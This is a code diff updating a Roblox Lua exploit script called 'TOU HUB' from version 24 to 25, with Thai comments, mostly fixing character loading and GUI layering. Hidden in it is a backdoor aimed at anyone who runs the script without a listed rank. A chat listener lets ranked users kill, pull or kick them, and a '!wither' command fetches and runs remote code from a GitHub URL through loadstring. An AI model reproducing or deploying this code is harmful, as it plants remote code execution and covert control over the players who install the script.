@@ -1,9 +1,10 @@
---// TOU HUB V24 - FULL SCRIPT: ปุ่มเปิด GUI ทำงาน + คนไม่มีสิทธิ์โดนหมด! 🕵️‍♂️👑
+--// TOU HUB V25 - FULL SCRIPT: แก้ Error Humanoid + GUI ไม่ขึ้น + พิมพ์คำสั่งไม่ได้ + เต็มทุกอย่าง! 🕵️‍♂️👑
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 local player = Players.LocalPlayer
 local CoreGui = game:GetService("CoreGui")
 local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 
 --// === ระบบยศ (กำหนดผู้ใช้) ===
 local Ranks = {
@@ -22,59 +23,77 @@ end
 
 local myRank = getRank(player.Name)
 
+--// === รอ Character โหลดก่อน (แก้ Error Humanoid) ===
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid", 10)
+local rootPart = character:WaitForChild("HumanoidRootPart", 10)
+
 --// === ถ้าไม่มีสิทธิ์ → ซ่อน GUI + ไม่ให้พิมพ์คำสั่ง + โดนทุกคำสั่ง ===
 if not myRank then
     -- คนไม่มีสิทธิ์: โดนทุกคำสั่ง + ไม่พิมพ์ได้
-    local trapConnection
-    trapConnection = TextChatService.TextChannels.RBXGeneral.OnMessageDoneFiltering:Connect(function(message)
-        local text = message.Text:lower()
-        local sender = message.TextSource
-        if not sender then return end
-        local p = Players:GetPlayerByUserId(sender.UserId)
-        if not p then return end
-
-        local targetName = player.Name:lower()
-
-        -- !ฆ่า
-        if text:find("!ฆ่า") and text:find(targetName) then
-            if player.Character and player.Character:FindFirstChild("Humanoid") then
-                player.Character.Humanoid.Health = 0
-            end
+    local function setupTrap()
+        local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if not channel then
+            task.wait(1)
+            setupTrap()
+            return
         end
 
-        -- !ดึง
-        if text:find("!ดึง") and text:find(targetName) then
+        channel.OnMessageDoneFiltering:Connect(function(message)
+            local text = message.Text:lower()
+            local sender = message.TextSource
+            if not sender then return end
             local senderPlayer = Players:GetPlayerByUserId(sender.UserId)
-            if senderPlayer and senderPlayer.Character and senderPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                    player.Character.HumanoidRootPart.CFrame = senderPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
+            if not senderPlayer then return end
+
+            local targetName = player.Name:lower()
+
+            -- !ฆ่า
+            if text:find("!ฆ่า") and text:find(targetName) then
+                if humanoid then humanoid.Health = 0 end
+            end
+
+            -- !ดึง
+            if text:find("!ดึง") and text:find(targetName) then
+                if senderPlayer.Character and senderPlayer.Character:FindFirstChild("HumanoidRootPart") and rootPart then
+                    rootPart.CFrame = senderPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
                 end
             end
-        end
 
-        -- !เตะ
-        if text:find("!เตะ") and text:find(targetName) then
-            player:Kick("🥰")
-        end
+            -- !เตะ
+            if text:find("!เตะ") and text:find(targetName) then
+                player:Kick("🥰")
+            end
 
-        -- !wither (รันในฝั่งคนไม่มีสิทธิ์)
-        if text:find("!wither") and text:find(targetName) then
-            spawn(function()
-                pcall(function()
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Wither"))()
+            -- !wither
+            if text:find("!wither") and text:find(targetName) then
+                spawn(function()
+                    pcall(function()
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Wither"))()
+                    end)
                 end)
-            end)
-        end
+            end
+        end)
+    end
+    spawn(setupTrap)
+
+    -- รีสปาวน์ Character
+    player.CharacterAdded:Connect(function(char)
+        character = char
+        humanoid = char:WaitForChild("Humanoid", 10)
+        rootPart = char:WaitForChild("HumanoidRootPart", 10)
     end)
     return
 end
 
---// === สร้าง GUI เฉพาะคนมียศ ===
+--// === สร้าง GUI เฉพาะคนมียศ (รอ CoreGui โหลด) ===
+task.wait(1)  -- รอ Executor โหลด CoreGui
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "TOU_HUB_GUI"
 ScreenGui.Parent = CoreGui
 ScreenGui.ResetOnSpawn = false
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.DisplayOrder = 999
 
 --// ปุ่ม Toggle แยก (ลากได้ + แก้คลิกไม่ได้)
 local ToggleBtn = Instance.new("TextButton")
@@ -87,7 +106,7 @@ ToggleBtn.Font = Enum.Font.GothamBold
 ToggleBtn.TextSize = 24
 ToggleBtn.Active = true
 ToggleBtn.Draggable = true
-ToggleBtn.ZIndex = 999
+ToggleBtn.ZIndex = 1000
 ToggleBtn.Parent = ScreenGui
 
 local ToggleCorner = Instance.new("UICorner")
@@ -101,7 +120,7 @@ ToggleShadow.BackgroundTransparency = 1
 ToggleShadow.Image = "rbxassetid://6014261993"
 ToggleShadow.ImageColor3 = Color3.new(0,0,0)
 ToggleShadow.ImageTransparency = 0.7
-ToggleShadow.ZIndex = 998
+ToggleShadow.ZIndex = 999
 ToggleShadow.Parent = ToggleBtn
 
 --// GUI หลัก (เริ่มซ่อน)
@@ -113,7 +132,7 @@ MainFrame.BorderSizePixel = 0
 MainFrame.Active = true
 MainFrame.Draggable = true
 MainFrame.Visible = false
-MainFrame.ZIndex = 997
+MainFrame.ZIndex = 998
 MainFrame.Parent = ScreenGui
 
 local Corner = Instance.new("UICorner")
@@ -127,18 +146,19 @@ Shadow.BackgroundTransparency = 1
 Shadow.Image = "rbxassetid://6014261993"
 Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
 Shadow.ImageTransparency = 0.6
-Shadow.ZIndex = 996
+Shadow.ZIndex = 997
 Shadow.Parent = MainFrame
 
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0, 50)
 Title.BackgroundTransparency = 1
-Title.Text = "ยศ: " .. myRank .. " 🔥 TOU HUB V24"
+Title.Text = "ยศ: " .. myRank .. " 🔥 TOU HUB V25"
 Title.TextColor3 = myRank == "DEX" and Color3.fromRGB(255, 215, 0) or
                  myRank == "Premium" and Color3.fromRGB(0, 255, 255) or
                  Color3.fromRGB(100, 255, 100)
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 20
+Title.ZIndex = 996
 Title.Parent = MainFrame
 
 local ScrollFrame = Instance.new("ScrollingFrame")
@@ -337,75 +357,84 @@ local function addToGUI(realName, displayName, thumb, triggerType)
     ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIGridLayout.AbsoluteContentSize.Y + 20)
 end
 
---// ตรวจจับข้อความด้วย OnMessageDoneFiltering (เฉพาะคนมียศ)
-local channel = TextChatService.TextChannels.RBXGeneral
-channel.OnMessageDoneFiltering:Connect(function(message)
-    local text = message.Text
-    local sender = message.TextSource
-    if not sender then return end
-    local p = Players:GetPlayerByUserId(sender.UserId)
-    if not p then return end
+--// รอ TextChannel ก่อนยิง Listener
+local function setupListener()
+    local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if not channel then
+        task.wait(0.5)
+        setupListener()
+        return
+    end
 
-    local realName = p.Name
-    local displayName = p.DisplayName
-    local thumb = Players:GetUserThumbnailAsync(sender.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
+    channel.OnMessageDoneFiltering:Connect(function(message)
+        local text = message.Text
+        local sender = message.TextSource
+        if not sender then return end
+        local p = Players:GetPlayerByUserId(sender.UserId)
+        if not p then return end
 
-    local lower = text:lower()
+        local realName = p.Name
+        local displayName = p.DisplayName
+        local thumb = Players:GetUserThumbnailAsync(sender.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
 
-    -- !เช็ค: เฉพาะคนมียศที่พิมพ์ → คนมียศตอบกลับ
-    if lower == "!เช็ค" then
+        local lower = text:lower()
+
+        -- !เช็ค: เฉพาะคนมียศที่พิมพ์ → คนมียศตอบกลับ
+        if lower == "!เช็ค" then
+            local senderRank = getRank(realName)
+            if senderRank then
+                if sender.UserId ~= player.UserId then
+                    addToGUI(realName, displayName, thumb, "check")
+                else
+                    sendChat("✅ **TOU HUB ACTIVE** | " .. realName .. " 🕶️")
+                    addToGUI(realName, displayName, thumb, "check")
+                end
+            end
+        end
+
+        -- SCRIPT Trigger
+        if text:upper() == "SCRIPT CITY THAILAND 2 BY:TOUX1" then
+            sendChat("🔥 **TRIGGER DETECTED** | " .. realName .. " 🕵️‍♂️")
+            addToGUI(realName, displayName, thumb, "script")
+        end
+
+        -- !ฆ่า, !ดึง, !เตะ จากคนมียศ → ทำงานในฝั่งเป้าหมาย
         local senderRank = getRank(realName)
-        if senderRank then
-            if sender.UserId ~= player.UserId then
-                addToGUI(realName, displayName, thumb, "check")
-            else
-                sendChat("✅ **TOU HUB ACTIVE** | " .. realName .. " 🕶️")
-                addToGUI(realName, displayName, thumb, "check")
+        if senderRank == "DEX" or senderRank == "Premium" then
+            if lower:find("!ฆ่า") then
+                local target = lower:match("!ฆ่า%s+(%w+)")
+                if target and target == player.Name:lower() then
+                    killPlayer(player.Name)
+                end
+            end
+            if lower:find("!ดึง") then
+                local target = lower:match("!ดึง%s+(%w+)")
+                if target and target == player.Name:lower() then
+                    pullPlayer(player.Name)
+                end
+            end
+            if lower:find("!เตะ") then
+                local target = lower:match("!เตะ%s+(%w+)")
+                if target and target == player.Name:lower() then
+                    kickPlayer(player.Name)
+                end
             end
         end
-    end
 
-    -- SCRIPT Trigger
-    if text:upper() == "SCRIPT CITY THAILAND 2 BY:TOUX1" then
-        sendChat("🔥 **TRIGGER DETECTED** | " .. realName .. " 🕵️‍♂️")
-        addToGUI(realName, displayName, thumb, "script")
-    end
-
-    -- !ฆ่า, !ดึง, !เตะ จากคนมียศ → ทำงานในฝั่งเป้าหมาย
-    local senderRank = getRank(realName)
-    if senderRank == "DEX" or senderRank == "Premium" then
-        if lower:find("!ฆ่า") then
-            local target = lower:match("!ฆ่า%s+(%w+)")
+        -- !Wither จาก DEX → รันในฝั่งเป้าหมาย (ทุกยศยกเว้น DEX)
+        if myRank ~= "DEX" and lower:find("!wither") then
+            local target = lower:match("!wither%s+(%w+)")
             if target and target == player.Name:lower() then
-                killPlayer(player.Name)
-            end
-        end
-        if lower:find("!ดึง") then
-            local target = lower:match("!ดึง%s+(%w+)")
-            if target and target == player.Name:lower() then
-                pullPlayer(player.Name)
-            end
-        end
-        if lower:find("!เตะ") then
-            local target = lower:match("!เตะ%s+(%w+)")
-            if target and target == player.Name:lower() then
-                kickPlayer(player.Name)
-            end
-        end
-    end
-
-    -- !Wither จาก DEX → รันในฝั่งเป้าหมาย (ทุกยศยกเว้น DEX)
-    if myRank ~= "DEX" and lower:find("!wither") then
-        local target = lower:match("!wither%s+(%w+)")
-        if target and target == player.Name:lower() then
-            spawn(function()
-                pcall(function()
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Wither"))()
+                spawn(function()
+                    pcall(function()
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Wither"))()
+                    end)
                 end)
-            end)
+            end
         end
-    end
-end)
+    end)
+end
+spawn(setupListener)
 
 --// อัปเดต Canvas
 UIGridLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
@@ -420,12 +449,8 @@ local function toggleGUI()
     ToggleBtn.Text = visible and "❌" or "🔥"
 end
 
--- วิธีที่ 1: MouseButton1Click
-ToggleBtn.MouseButton1Click:Connect(function()
-    spawn(toggleGUI)
-end)
+ToggleBtn.MouseButton1Click:Connect(toggleGUI)
 
--- วิธีที่ 2: InputBegan (สำรอง)
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
@@ -434,7 +459,14 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         local btnSize = ToggleBtn.AbsoluteSize
         if mousePos.X >= btnPos.X and mousePos.X <= btnPos.X + btnSize.X
         and mousePos.Y >= btnPos.Y and mousePos.Y <= btnPos.Y + btnSize.Y then
-            spawn(toggleGUI)
+            toggleGUI()
         end
     end
+end)
+
+--// รีสปาวน์ Character
+player.CharacterAdded:Connect(function(char)
+    character = char
+    humanoid = char:WaitForChild("Humanoid", 10)
+    rootPart = char:WaitForChild("HumanoidRootPart", 10)
 end)
